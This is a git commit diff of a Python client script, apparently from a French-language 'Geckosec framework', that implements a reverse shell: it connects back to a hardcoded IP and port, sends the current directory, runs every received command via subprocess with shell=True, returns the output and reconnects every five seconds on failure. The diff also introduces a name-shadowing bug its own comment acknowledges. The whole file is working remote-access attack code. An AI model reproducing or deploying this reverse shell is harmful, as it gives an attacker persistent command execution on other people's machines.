87da51dd6e51b989ff2d5e54dadf65eade7ec274
Elieroc <34548349+Elieroc@users.noreply.github.com>
2021-02-08 23:17:04 +0100

    Function implemented

--- client.py
+++ client.py
@@ -11,47 +11,64 @@
 import socket
 import subprocess
 import os
+import time
 
-host, port = ('192.168.43.90', 1235)
-socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def main():
 
-try :
-    socket.connect((host, port))
-    print(" /!\ Client connecté /!\ \n")
+    global socket
 
-    # On envoie le path
-    path = os.getcwd().encode("utf8")
-    socket.send(path)
+    # Pour régler le soucis, essayer de changer la variable socket par sock
+    socket = 0
 
-    while True:
-        command = socket.recv(9999)
-        command = command.decode("utf8")
+    host = '192.168.1.100'
+    port = 1235
+    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+    try:
+        socket.connect((host, port))
+        print(" /!\ Client connecté /!\ \n")
 
-        if command[:2] == "cd":
-            try :
-                new_dir = os.open( command[3:].strip() , os.O_RDONLY )
-                os.chdir(new_dir)
+        # On envoie le path
+        path = os.getcwd().encode("utf8")
+        socket.send(path)
 
-                result = os.getcwd()
-                socket.send(result.encode())
-            except:
-                result = "Le chemin invalide ou vous n'avez pas les permissions !"
-                socket.send(result.encode())
-        else:
+        while True:
+            command = socket.recv(9999)
+            command = command.decode("utf8")
 
-            print("> " + command)
+            if command == "exit":
+                print("Merci d'avoir utilisé Geckosec framework !")
+                time.sleep(0.5)
+                socket.close()
 
-            result = subprocess.check_output(command, shell=True)
-            # Parfois la commande ne retourne rien et donc génère une erreur d'où l'utilité de ce if
-            if result.decode("utf-8", errors="ignore") == "":
-                result = " "
-                socket.send(result.encode())
+            if command[:2] == "cd":
+                try :
+                    new_dir = os.open( command[3:].strip() , os.O_RDONLY )
+                    os.chdir(new_dir)
+
+                    result = os.getcwd()
+                    socket.send(result.encode())
+                except:
+                    # On envoie le path où est l'utilisateur (car le new est innaccessible)
+                    result = os.getcwd()
+                    socket.send(result.encode())
             else:
-                #print(result.decode("utf-8", errors="ignore"))
-                socket.send(result)
 
-except:
-    print(' /!\ Connexion au serveur échouée /!\ ')
-finally:
-    socket.close()
+                print("> " + command)
+
+                result = subprocess.check_output(command, shell=True)
+                # Parfois la commande ne retourne rien et donc génère une erreur d'où l'utilité de ce if
+                if result.decode("utf-8", errors="ignore") == "":
+                    result = " "
+                    socket.send(result.encode())
+                else:
+                    #print(result.decode("utf-8", errors="ignore"))
+                    socket.send(result)
+    except:
+        print('\n /!\ Connexion au serveur échouée /!\ \n')
+        time.sleep(5)
+        main()
+    finally:
+        socket.close()
+
+#main()
